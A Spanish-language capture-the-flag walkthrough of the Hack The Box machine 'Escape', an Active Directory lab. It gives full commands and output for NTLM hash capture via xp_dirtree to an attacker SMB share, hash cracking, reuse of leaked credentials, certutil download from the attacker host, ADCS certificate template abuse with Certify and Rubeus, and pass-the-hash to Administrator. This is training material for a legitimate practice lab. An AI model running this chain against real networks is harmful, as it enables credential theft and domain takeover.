Maquina Escape de dificultad media de la plataforma de Hack The Box

![](/assets/img/escape/machine.png)
## Enumeracion

Empezemos Haciendo un escaneo de puertos a la maquina victima

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 17:56 -05
Nmap scan report for 10.10.11.202
Host is up (0.095s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49708/tcp open  unknown
49712/tcp open  unknown
59887/tcp open  unknown
```
Intentemos Detectar que version Corre para estos puertos
```bash
❯ nmap -Pn -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,49701,49705,58687 -oN targeted 10.129.163.140

Nmap scan report for 10.129.163.140
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-27 02:52:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-27T02:54:01+00:00; +8h02m14s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-27T02:54:02+00:00; +8h02m14s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-27T01:03:49
|_Not valid after:  2053-02-27T01:03:49
|_ssl-date: 2023-02-27T02:54:01+00:00; +8h02m14s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T02:54:01+00:00; +8h02m14s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T02:53:59+00:00; +8h02m14s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49701/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
58687/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Empezemos Enumerando los recursos compartidos a nivel de Red.

```bash
❯ smbmap -H 10.10.11.202 -u 'null'
[+] Guest session   	IP: 10.10.11.202:445	Name: sequel.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Public                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```
Vemos un directorio  Public Enumeremos este directorio para ver que archivos tiene dentro

```bash
❯ smbmap -H 10.10.11.202 -u 'null' -r public
[+] Guest session   	IP: 10.10.11.202:445	Name: sequel.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	public                                            	READ ONLY	
	.\public\*
	dr--r--r--                0 Sat Nov 19 06:51:25 2022	.
	dr--r--r--                0 Sat Nov 19 06:51:25 2022	..
	fr--r--r--            49551 Sat Nov 19 06:51:25 2022	SQL Server Procedures.pdf
```
Descarguemos este pdf para ver que informacion tiene.
```bash
❯ smbmap -H 10.10.11.202 -u 'null' --download "Public/SQL Server Procedures.pdf"
[+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
[+] File output to: /home/blank/Desktop/htbMachine/escape/content/10.10.11.202-Public_SQL Server Procedures.pdf
```
Si abrimos este pdf al final del documento nos dan unas credenciales de acceso a la base de datos, Connectemosnos con la herramienta mssqlclient.py 
```bash
❯ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```
## Intrusion
Con el usuario que nos loguiamos no tenemos capacidad de activar las opciones avanzados ni de usar xp_cmdshell, pero todo no esta perdido ya que podemos hacer uso de xp_dirtree para que se conecte a nuestro recurso compartido a nivel de red y asi poder capturar el hash ntlm v2 al momento que se conecte.

Montamos el servidor 
```bash
❯ smbserver.py $(pwd) smb -smb2support
```
Desde la consola de la base de datos
```bash
SQL> xp_dirtree "\\10.10.14.123\smb\"
```
Y en el servidor nos llega la autenticacion a nivel de red
```bash
❯ smbserver.py $(pwd) smb -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,62408)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:33a8c45edc3262f3001d55e2299b2300:010100000000000080b7664dc14fd901761fe405f2723dfb00000000010010004b00670052004e006600530042006100020010007400460067004d006600580051006e00030010004b00670052004e006600530042006100040010007400460067004d006600580051006e000700080080b7664dc14fd9010600040002000000080030003000000000000000000000000030000059047754121c9eb15faabcdbbb8b2de26a14104a08a1c56a1f19fbc07d8adace0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320033000000000000000000
[*] Closing down connection (10.10.11.202,62408)
[*] Remaining connections []
```
Pongamos este hash en un archivo para intentar romperlo por fuerza bruta
```bash
❯ cat hash
sql_svc::sequel:aaaaaaaaaaaaaaaa:7f8699add3ae233d83b64aaa40c1b557:010100000000000000acc69fcd4ed9019c2ca62360664d380000000001001000790064004d006e004500440071007a0002001000640070004e004c0064006a004600520003001000790064004d006e004500440071007a0004001000640070004e004c0064006a00460052000700080000acc69fcd4ed90106000400020000000800300030000000000000000000000000300000924306984f73ff5a3d54d3e89b54431796081806f6384c548695506609730c8a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380036000000000000000000
```
Le pasamos el hash a john y nos da la contraseña en texto claro
```bash
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:18 DONE (2023-03-05 19:22) 0.05543g/s 593284p/s 593284c/s 593284C/s RENZOJERSON..RBDfan
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Podemos comprobar que las credenciales son correctas usando crackmapexec
```bash
❯ crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
```
si las probamos por winrm tambien nos pone un mas por lo que nos podemos connectar usando evil-winrm
```bash
❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```
## Movimiento Lateral

Despues de estar un rato enumerando el sistema me encontre un archivo interesante de logs de mssql.
```bash
*Evil-WinRM* PS C:\SQLserver\logs> dir


    Directory: C:\SQLserver\logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLserver\logs> 
```
Si nos traemos este archivo a nuestra maquina y filtramos por password podemos ver credenciales en texto claro del usuario Ryan.Cooper
```bash
❯ cat data.txt |grep -i 'password'
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
Usemos estas credenciales para conectarnos con evil-winrm
```bash
❯ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

## Escalada De privilegios
Como esto es un AD(Directorio Activo) voy a tirar de BloodHound para enumerar todo el dominio.

Para recolectar toda la informacion voy a usar [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) el cual me crea un comprimido y este es el que hay que subir al BloodHound, Subamos el binario a la maquina
```bash
*Evil-WinRM* PS C:\tmp> upload SharpHound.exe
Info: Uploading SharpHound.exe to C:\tmp\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!
```
Lo ejecutamos
```bash
*Evil-WinRM* PS C:\tmp> ./SharpHound.exe
2023-03-06T23:28:35.2912927-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-03-06T23:28:35.4162904-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-06T23:28:35.4319410-08:00|INFORMATION|Initializing SharpHound at 11:28 PM on 3/6/2023
2023-03-06T23:28:35.5881763-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-06T23:28:35.7600465-08:00|INFORMATION|Beginning LDAP search for sequel.htb
2023-03-06T23:28:35.7912729-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-03-06T23:28:35.8068975-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-03-06T23:29:06.5096971-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-03-06T23:29:21.7175581-08:00|INFORMATION|Consumers finished, closing output channel
2023-03-06T23:29:21.7488080-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-03-06T23:29:21.9206988-08:00|INFORMATION|Status: 97 objects finished (+97 2.108696)/s -- Using 42 MB RAM
2023-03-06T23:29:21.9206988-08:00|INFORMATION|Enumeration finished in 00:00:46.1755427
2023-03-06T23:29:21.9988234-08:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
 56 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-03-06T23:29:22.0144527-08:00|INFORMATION|SharpHound Enumeration Completed at 11:29 PM on 3/6/2023! Happy Graphing!
```
este comprimido que nos crea es el que tenemos que traernos a nuestra maquina.
```bash
*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2023  11:29 PM          11546 20230306232921_BloodHound.zip
-a----         3/6/2023  11:29 PM           8395 NjQ0M2M1ZmEtNTkyNy00OWNjLWJmNzAtOWZiMzUxMzM4MmNj.bin
-a----         3/6/2023  11:26 PM        1051648 SharpHound.exe
```
Para Descargar este comprimido lo voy a mover a la ruta de un recurso compartido.
```bash
*Evil-WinRM* PS C:\tmp> cp 20230306233749_BloodHound.zip ../Public
```
Lo descargamos usando smbmap
```bash
❯ smbmap -H 10.10.11.202 -u 'null' --download "Public/20230306233749_BloodHound.zip"
[+] Starting download: Public\20230306233749_BloodHound.zip (11680 bytes)
[+] File output to: /home/blank/Desktop/htbMachine/escape/content/blood/10.10.11.202-Public_20230306233749_BloodHound.zip
```
Para acceder al BloodHound necesitamos que neo4j este corriendo para esto solo ejecutamos el siguiente comando
```bash
❯ neo4j start
```
Las credenciales predeterminadas Para acceder son neo4j y neo4j Una vez dentro, Subimos el comprimido Que nos descargamos de la maquina victima.
![](/assets/img/escape/blood.png)
Ya con este archivo subido podemos empezar a enumerar, filtremos por nuestro usuario y veamos que informacion nos reporta.
![](/assets/img/escape/user.png)
Y le damos en la opcion Unrolled Group Membership Que nos aparece al lado izquierdo, podemos ver que pertenecemos a un grupo interesante.
![](/assets/img/escape/cert.png)
Investingando un rato por google veo que atraves de este grupo se puede obtener el hash ntlm del usuario administrator este hash nos sirve para aplicar pass the hash.

Para explotar esto necesitamos dos binarios [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) y [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) Descarguemos estos binarios y subamoslos a la maquina victima.

```bash
*Evil-WinRM* PS C:\tmp> upload Rubeus.exe
*Evil-WinRM* PS C:\tmp> upload Certify.exe
```
Una vez subidos este dos binarios ejecutemos el Certify para identificar las pantillas de certificados vulnerables.
```bash
*Evil-WinRM* PS C:\tmp> ./Certify.exe find /vulnerable


[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.9250618
```
Encontramos una pantilla ahora ejecutemos el siguiente comando.
```bash
*Evil-WinRM* PS C:\tmp> ./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
Este comandos nos vuelve bastante contenido tenemos que quedarnos con la clave privada y el certificado copiarlo y ponerlo en un mismo archivo, ahora ejecutemos el siguiente comando

```bash
❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```
Este cert.pfx lo tenemos que subir a la maquina victima.

```bash
❯ sudo python3 -m http.server 80
```
Y Descargamos el archivo en la maquina
```bash
*Evil-WinRM* PS C:\tmp> certutil.exe -split -f -urlcache http://10.10.14.138/cert.pfx
```
Vale teniendo este archivo ya podemos ejecutar rubeus para obtener el hash ntlm, ejecutamos este comando

```bash
*Evil-WinRM* PS C:\tmp> ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
Al final del todo nos reporta esta columna donde nos dan el hash ntlm del usuario administrator
```bash
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```
Ya nos podemos conectar con evil-winrm haciendo un pass the hash
```bash
❯ evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
Gracias Por leer